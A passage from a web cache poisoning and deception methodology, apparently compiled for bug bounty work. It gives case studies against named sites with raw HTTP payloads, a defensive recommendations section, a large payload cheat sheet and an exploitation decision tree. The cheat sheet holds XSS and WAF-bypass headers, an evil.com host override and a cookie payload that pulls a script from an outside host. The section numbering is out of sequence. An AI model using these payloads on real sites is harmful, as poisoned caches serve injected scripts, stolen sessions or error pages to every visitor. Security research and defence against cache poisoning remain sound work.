  GET /index.php?dontpoisoneveryone=1 HTTP/1.1
  Host: www.hackerone.com
  X-Forwarded-Port: 123
  ```
- **Response:** `Location: https://www.hackerone.com:123/` → connection timeout
- **Impact:** Persistent DoS on `/index.php` until cache expires

### 9.27 James Kettle — PayPal: Invalid Transfer-Encoding ($9,700)
- **Technique:** Invalid `Transfer-Encoding` header cached as 501 for JS files
- **Payload:**
  ```
  GET /important.js HTTP/1.1
  Host: www.paypalobjects.com
  Transfer-Encoding: invalid
  ```
- **Response:** `501 Not Implemented`
- **Impact:** Core JS files unavailable → site-wide functional degradation

### 9.28 James Kettle — Instagram: Underscore Header Variant ($1,000)
- **Technique:** `Accept_Encoding: br` (underscore instead of hyphen)
- **Payload:**
  ```
  GET /page HTTP/1.1
  Host: instagram.com
  Accept_Encoding: br
  ```
- **Root cause:** `Accept-Encoding` is keyed, but `Accept_Encoding` (underscore variant) is unkeyed
- **Impact:** Brotli-encoded response cached; old browsers/proxies cannot decode → broken page for specific user segments

### 9.29 James Kettle — Twitter: Invalid Range Header (Unpatched)
- **Technique:** `Range: bytes=cow` causes 400 cached for JS files
- **Payload:**
  ```
  GET /core.js HTTP/1.1
  Host: abs.twimg.com
  Range: bytes=cow
  ```
- **Impact:** 400 Bad Request cached for core JS → site unusable

### 9.30 James Kettle — Bitbucket: Scheme Contradiction ($1,800)
- **Technique:** `X-Forwarded-SSL: off` contradicts HTTPS scheme
- **Payload:**
  ```
  GET /page HTTP/1.1
  Host: bitbucket.org
  X-Forwarded-SSL: off
  ```
- **Response:** `400 Bad Request — Contradictory scheme headers`
- **Impact:** Error page cached for legitimate URL

### 9.31 James Kettle — Undisclosed: Accidental User-Agent Poisoning ($7,500)
- **Technique:** IE9 User-Agent triggered "Please update your browser" page
- **Payload:** Burp Repeater's "Paste URL as request" used IE9 User-Agent
- **Impact:** Browser update page cached under normal page key → all visitors received it regardless of actual browser

### 9.18 iustin24 — Cloudflare / Varnish: Capitalized Host Header
- **Technique:** Host header casing discrepancy
- **Payload:** `Host: TARGET.COM`
- **Root cause:** Cache lowercased `Host` for cache key but forwarded original casing to origin
- **Impact:** Vary response cached for all normal traffic
- **Note:** Patched by Cloudflare and Fastly in default configurations; still affects custom Varnish stacks

### 9.19 iustin24 — Apache Traffic Server: Fragment Cache Poisoning (CVE-2021-27577)
- **Technique:** URL fragment ignored in cache key but forwarded to origin
- **Payload:**
  ```
  GET /index.html#/../admin HTTP/1.1
  Host: target.com
  ```
- **Root cause:** ATS cache key extraction ignored fragment; backend proxies encoded `#` → `%23`, changing the effective path
- **Impact:** Arbitrary path response cached under benign key; redirect/XSS escalation possible if backend normalizes traversal

### 9.20 iustin24 — Fastly: Host Header Injection via `Fastly-Host` (Cross-Origin Poisoning)
- **Technique:** Fastly VCL validated whitelist via `Fastly-Host`, but cache key matched `Fastly-Host` while origin received raw `Host`
- **Payload:**
  ```
  GET /test.html HTTP/1.1
  Host: redacted-cdn.com
  Fastly-host: assets.redacted.com
  ```
- **Root cause:** `Fastly-host` satisfied whitelist validation and generated cache key for `assets.redacted.com`, but origin served content from `redacted-cdn.com`
- **Impact:** DOM-XSS file from `redacted-cdn.com` cached and executed under `assets.redacted.com`

### 9.21 iustin24 — Fastly: Encoded Parameter Keyed Injection
- **Technique:** Duplicate parameter with encoded name bypassed cache key extraction
- **Payload:** `GET /images/logo.png?size=32x32&siz%65=0 HTTP/1.1`
- **Root cause:** Cache keyed on literal `size=32x32`; backend decoded `%65` → `e`, overwriting parameter with `size=0`
- **Impact:** Cacheable `400 Bad Request` stored under legitimate image key → image delivery DoS

### 9.22 iustin24 — Multiple Targets: Scanner User-Agent Blocking
- **Technique:** Security-scanner User-Agent strings triggered cacheable `403 Forbidden`
- **Payload:** `User-Agent: Fuzz Faster U Fool`
- **Root cause:** Origin blocked scanner UAs; CDN cached the 403 without keying on User-Agent
- **Impact:** Persistent DoS on the poisoned path for all visitors

### 9.23 iustin24 — Exodus: Azure Storage Authorization Poisoning ($2,500)
- **Technique:** Malformed `Authorization` header on Azure Blob Storage
- **Payload:**
  ```
  GET /exodus-linux-x64-21.4.9.zip HTTP/1.1
  Host: downloads.exodus.com
  Authorization: SharedKeyLite myaccount: ctzMq...
  ```
- **Root cause:** Azure returned `403 Forbidden`; CDN cached the error
- **Impact:** Installer download permanently blocked for all users
- **Reference:** Cloudflare patched default 403 caching August 3, 2021

### 9.24 iustin24 — GitHub: Invalid Content-Type 406 CP-DoS ($7,500)
- **Technique:** Invalid `Content-Type` header triggered `406 Not Acceptable`
- **Payload:**
  ```
  GET /iustin24/Cache-Key-Normalization-Denial-of-Service HTTP/2
  Host: github.com
  content-type: iustin
  ```
- **Root cause:** GitHub included auth cookie in cache key (protecting logged-in users), but all unauthenticated users shared one key
- **Impact:** Complete repository denial for logged-out users
- **Key lesson:** Partial cache-key protection (per-session) still leaves unauthenticated traffic vulnerable to single-request DoS

---

## 10. DEFENSIVE RECOMMENDATIONS

> *"The sheer complexity of caches makes it difficult to have any confidence that they are secure. That said, there are some broad approaches you can take to avoid the worst issues."*

### A. Architectural Defenses
1. **Disable caching entirely if not strictly necessary**
   Many organizations adopt CDNs (Cloudflare, Fastly) for DDoS protection, SSL termination, or geographic distribution, but inadvertently enable caching by default. If caching is not a deliberate design choice, turn it off.

2. **Restrict caching to purely static responses**
   Only cache responses that contain no user data, no auth state, no dynamic content, and no header-based personalization. Any response containing cookies, user names, or dynamic URLs should be marked uncacheable.

3. **Never take input from headers or cookies for dynamic content generation**
   Avoid using `X-Forwarded-Host`, `X-Forwarded-Proto`, `Origin`, `Referer`, or cookies to construct URLs, meta tags, redirects, or resource imports. If you must use them, treat them as untrusted input and sanitize rigorously.

4. **Audit every page with Param Miner**
   Frameworks (Symfony, Drupal, Zend, Rack, Rails) sneak in support for dangerous headers (`X-Original-URL`, `X-Rewrite-URL`) without the developer's knowledge. A comprehensive audit is the only way to discover latent unkeyed inputs.

5. **Strip unnecessary headers at the cache or edge layer**
   Remove headers that the origin does not need before forwarding:
   ```
   X-Original-URL, X-Rewrite-URL, X-HTTP-Method-Override
   X-Forwarded-Host, X-Forwarded-Scheme, X-Host
   Fastly-host (if not used by origin)
   ```

### B. Cache Configuration Defenses
6. **Mark every dynamic response:**
   ```
   Cache-Control: no-store, private
   ```
   Note: `private` is not universally respected. Test with and without session cookies to confirm.

7. **Don't exclude components from the cache key for performance — rewrite the actual request instead**
   Instead of dropping query parameters or cookies from the key, **rewrite the actual request** at the edge to normalize them. This achieves the same performance gains while massively reducing the likelihood of cache poisoning problems. Performance gains from dropping key components are outweighed by the security risk.

8. **Use `Vary` correctly — but don't rely on it alone**
   The `Vary` header instructs caches to include additional request headers in the cache key. However, CDNs like Cloudflare may ignore `Vary`, and internal caches may implement it inconsistently. Use `Vary` as a hint, not a primary defense.

9. **Disable error page caching in all CDN configurations**
   - **CloudFront:** Disable error page caching in distribution settings
   - **Akamai:** Configure "Cache Error Responses" behavior to off
   - **Varnish:** Use `beresp.uncacheable` for all 4xx/5xx responses
   - **Cloudflare:** Ensure 403 caching is disabled (default changed August 2021)

10. **Return 431 Request Header Fields Too Large for oversized headers**
    Unlike `400 Bad Request`, `431` is **never cached by any web caching system**. If your origin rejects headers due to size or count, return `431`.

### C. Origin-Specific Defenses
11. **Consistent URL parsing between cache and origin**
    Ensure the CDN and origin handle fragments, encoded characters, delimiters (`;`, `#`, `%00`), and normalization (`/../`) identically. Mismatches are the root cause of most cache deception and normalization-discrepancy attacks.

12. **Enable cache deception armor (Cloudflare)**
    If supported, enable "Cache Deception Armor" which verifies the response `Content-Type` matches the request's file extension. Note: unfamiliar extensions (`.avif`, `.woff2`) may bypass this armor.

### D. Client-Side Defenses
13. **Remediate client-side vulnerabilities regardless of current exploitability**
    DOM-based XSS, unsafe `eval()` of JSON, and unsanitized insertion of header-derived values into the DOM may seem unexploitable because users cannot normally send custom headers cross-origin. But cache poisoning removes that barrier entirely. Fix client-side sinks as if the attacker controls the input directly.

### E. WAF and Security Control Placement
14. **Correct placement:** WAF → Cache → Origin
    The WAF must sit **before** the cache. If the WAF sits between the cache and origin, WAF-generated block pages get cached and served to all users.

### F. Historical Patch References
- **Drupal/Symfony/Zend:** CVE-2018-14773 / SA-CORE-2018-005 / ZF2018-01 (2018-08-01) — disabled `X-Original-URL` and `X-Rewrite-URL` header support by default
- **Cloudflare:** Default 403 caching disabled (2021-08-03)
- **Fastly / Cloudflare:** Capitalized `Host` header normalization fixed in default configurations (2021)

---

## 10. QUICK REFERENCE: PAYLOAD PATTERNS

### Web Cache Deception (victim must visit)
```
# Static Extension (Spring)
/myAccount;.css

# Static Extension (Rails)
/myAccount.css

# Static Extension (encoded)
/myAccount%3fwcd.css
/myAccount%23wcd.js

# Cloudflare Cache Deception Armor Bypass
/profile.avif
/profile.webp
/profile.woff2

# Semicolon prefix technique
/endpoint/;.js
/endpoint/;.css
/endpoint/;.woff2

# Static Directory (origin normalizes)
/static/..%2fprofile

# Static Directory (cache normalizes, need delimiter)
/profile;%2f%2e%2e%2fstatic

# Static File
/profile%2f%2e%2e%2findex.html?cb=123

# IIS Backslash
/profile%5C..%5Cstatic

# Cookie caching test
/app/conversation/1.js
```

### Web Cache Poisoning (direct attacker action)
```
# Test unkeyed headers
X-Forwarded-Host: evil.com
X-Forwarded-Proto: http
X-Forwarded-Scheme: http
X-Forwarded-Port: 1337
Referer: ?</script><svg/onload=alert(1)>

# Unkeyed GET parameters
GET /page?utm_content="><script>alert(1)</script>
GET /page?fbclid=<svg onload=alert(1)>

# Parameter cloaking
/?keyed=a&excluded=123;keyed=malicious

# Fat GET
GET /?param=innocent
Body: param=malicious

# Key normalization
GET /page?param="><test>
GET /page?param=%22%3e%3ctest%3e

# Path splitting
GET //page
GET /%2Fpage
GET /index.php/xyz

# Method override poisoning
GET /static/app.js
X-HTTP-Method-Override: HEAD

# Backslash normalization discrepancy
GET /admin\dashboard

# Resource import poisoning
GET /style.css?excluded=alert(1)%0A{}*{color:red;}

# Cache key injection
Origin: '-alert(1)-'__

# Multi-header payload splitting (WAF bypass)
Cookie: gdId=xss</script%20
X-Forwarded-For: xss
X-Forwarded-For: xss><svg/onload=globalThis[`al`+/ert/.source]`1`//
X-Forwarded-For: >

# jQuery $.getScript XSS via cookie
Cookie: n_vis=xssx'*$.getScript`//593.xss.ht`//;

# Akamai DoS via malformed header
\\: garbage

# Capitalized host header
Host: TARGET.COM

# Fastly-Host cross-origin injection
Fastly-host: assets.target.com

# Encoded duplicate parameter
GET /image?size=100x100&siz%65=0

# Storage bucket authorization poisoning
Authorization: SharedKeyLite myaccount: invalid
```

### Cache Poisoning for Persistent DoS (James Kettle)
```
# WAF block page poisoning (Tesla)
GET /page?dontpoisoneveryone=1
Any-Header: burpcollaborator.net

# Invalid port redirect timeout (HackerOne)
GET /index.php?dontpoisoneveryone=1
X-Forwarded-Port: 123

# Invalid Transfer-Encoding (PayPal)
GET /important.js
Transfer-Encoding: invalid

# Underscore header variant (Instagram)
GET /page
Accept_Encoding: br

# Invalid Range header (Twitter)
GET /core.js
Range: bytes=cow

# Scheme contradiction (Bitbucket)
GET /page
X-Forwarded-SSL: off

# Old browser accidental poison
GET /page
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1)

# Scanner user-agent blocking
GET /page
User-Agent: Fuzz Faster U Fool

# Invalid Content-Type (GitHub)
GET /repo HTTP/2
content-type: invalid

# Azure/S3 authorization poison
GET /file.zip
Authorization: SharedKeyLite myaccount: invalid
```

### Cache-What-Where
```
# Poison script with redirect
GET /main.js
X-Forwarded-Host: evil.com

# Arbitrary key poisoning via normalization discrepancy
GET /nonexistent/..%2f/home
(If origin doesn't normalize, cache does — 404 response poisons /home)

# Self-XSS → stored XSS via cache
GET /search
Referer: ?</script><svg/onload=eval(atob(this.id)) id=PAYLOAD>

# Malformed header DoS
\\: garbage

# URL fragment discrepancy (ATS)
GET /page#/../admin

# Fastly-Host origin swap
GET /test.html
Host: origin-a.com
Fastly-host: origin-b.com
```

---

## 11. EXPLOITATION DECISION TREE

```
START
│
├─ Can you control the response content via unkeyed inputs?
│  ├─ YES → Web Cache Poisoning (Phase 1-3)
│  │         ├─ Reflected in body? → XSS, resource import, DOM-based
│  │         ├─ Affects redirect? → Open redirect, site defacement
│  │         ├─ Cookie reflected? → Session theft, keylogger, ATO
│  │         ├─ Stored in fragment? → Fragment cache poisoning
│  │         ├─ OG meta / social tags? → Open Graph hijacking
│  │         └─ Translation / JSON loaded by frontend? → DOM-based poisoning
│  │
│  ├─ Can you manipulate internal routing via unkeyed headers?
│  │  ├─ YES → Route Poisoning
│  │  │         ├─ X-Original-URL / X-Rewrite-URL? → Path swap, local route poisoning
│  │  │         ├─ X-Forwarded-Server / X-Host? → SaaS tenant misrouting
│  │  │         └─ Combined with redirect gadgets? → Persistent redirect hijacking
│  │  │
│  │  └─ NO → Continue below
│  │
│  ├─ Are there URL parsing discrepancies?
│  │  ├─ YES → Web Cache Deception
│  │  │         ├─ Different delimiters? → Static extension/dir/file
│  │  │         ├─ Different normalization? → Traversal abuse
│  │  │         ├─ Different encoding? → Double-decode chains
│  │  │         ├─ Armor bypass? → .avif, .woff2, semicolon prefix
│  │  │         └─ Cookie caching? → Session theft via static extension
│  │  │
│  │  └─ NO → Continue below
│  │
│  ├─ Can you exploit via key generation or forwarding flaws?
│  │  ├─ YES → Implementation flaw attacks
│  │  │         ├─ Port excluded? → Port injection
│  │  │         ├─ Query excluded? → Query parameter XSS
│  │  │         ├─ UTM params unkeyed? → Cache pollution
│  │  │         ├─ Parameter cloaking? → Override keyed params
│  │  │         ├─ Fat GET supported? → Body injection
│  │  │         ├─ Method override? → HEAD/POST poisoning
│  │  │         ├─ Normalization weakness? → Encoding discrepancy
│  │  │         ├─ Backslash discrepancy? → 404 DoS
│  │  │         ├─ Key injectable? → Composite key attack
│  │  │         ├─ Capitalized Host? → Host casing poisoning
│  │  │         ├─ Fastly-Host present? → Cross-origin poisoning
│  │  │         ├─ URL fragment forwarded? → ATS fragment poisoning
│  │  │         └─ Encoded param names? → Duplicate keyed injection
│  │  │
│  │  └─ NO → Continue below
│  │
│  ├─ Is there a "useless" reflected or isolated vulnerability?
│  │  ├─ YES → Cache-What-Where
│  │  │         ├─ Header-based redirect? → Script poisoning
│  │  │         ├─ Self-XSS? → Cache-stored XSS
│  │  │         ├─ Referer reflected? → Stored XSS
│  │  │         ├─ Cacheable error? → Error page poisoning (CPDoS)
│  │  │         ├─ Invalid header → error? → HHO / HMC / HMO
│  │  │         ├─ Scanner UA blocked? → UA-based CPDoS
│  │  │         ├─ Invalid Authorization? → Bucket CPDoS
│  │  │         └─ Vary selective? → Targeted or hidden poisoning
│  │  │
│  │  └─ NO → Not directly exploitable alone
│  │
│  └─ Can inputs be chained for escalation?
│          ├─ YES → Multi-input chaining
│          │         ├─ Host + scheme override? → Arbitrary redirect
│          │         ├─ Path override + redirect? → Persistent redirect hijack
│          │         ├─ Internal + external cache? → Nested poisoning
│          │         └─ WCD + WCP + XSS? → Account takeover chain
│          │
│          └─ NO → Not exploitable via cache (at current scope)
│                  └─ Consider expanding header wordlist or testing other paths
```

---

## 12. REAL-WORLD DISCLOSURES & VALIDATION

This methodology synthesizes techniques validated across:
- **MANSCAPED, UiPath, Tesco, Airbnb, Zooplus, Notion, Vercel, Pleo** (PortSwigger bug bounty research)
- **Shopify, GitLab, HackerOne, Lyst, Omise** (disclosed HackerOne reports)
- **Bug bounty writeups**: bxmbn, alitoni224, infosecwriteups ($15k–$16.5k series)
- **11,158+ public HackerOne reports** analyzed for cache vulnerability patterns
- **Cloudflare, Akamai, CloudFront, Azure, Imperva, Fastly, Google Cloud** CDN behaviors
- **Spring, Rails, Nginx, Apache, IIS, OpenLiteSpeed, Node, PHP, .NET** origin frameworks

Always validate findings:
1. Poison with cache buster first
2. Verify payload executes in isolation
3. Remove cache buster and confirm victim traffic receives payload
4. Document cache duration and re-poisoning requirements
5. Test across multiple cache nodes (CDN edge locations)

---

## 13. CONCLUSION

Web caches have escaped serious scrutiny for years. The sheer diversity of caching issues discovered during this research suggests that there are plenty of as-yet undiscovered flaws in our future, especially considering that many of the issues discovered were only found due to convenient information leaks, brute-force guesswork, and blind luck. As such, we can expect to see entire new classes of cache poisoning issues arise in the future.

Alongside HTTP Request Smuggling, this is another example of flaws arising from complex interactions between separate systems that largely evade detection during both static analysis and white-box testing, then pop up in the production environment.

**The only realistic way to achieve resilience against this attack is to acknowledge that web caching redefines what's exploitable, and treat "unexploitable" vulnerabilities as genuine security issues.**

---

*Methodology compiled: 2026-07-31*
*Sources:*
- PortSwigger Research: "Gotta cache 'em all" (Doyhenard, 2024)
- PortSwigger Research: "Practical Web Cache Poisoning" (Kettle, 2018)
- PortSwigger Research: "Web Cache Entanglement" (Kettle, 2020)
- Web Security Academy: WCD, WCP, Design Flaws, Implementation Flaws
- HackerOne Reports: #1695604 (Shopify), #1160407 (GitLab), #1181946 (HackerOne), #631589 (Lyst), #3183046 (Omise)
- Bug Bounty Writeups: bxmbn, infosecwriteups ($15k–$16.5k series), alitoni224, iustin24 (70+ reports, $2,500–$7,500 range)
- CVE-2021-27577: Apache Traffic Server URL Fragment Handling
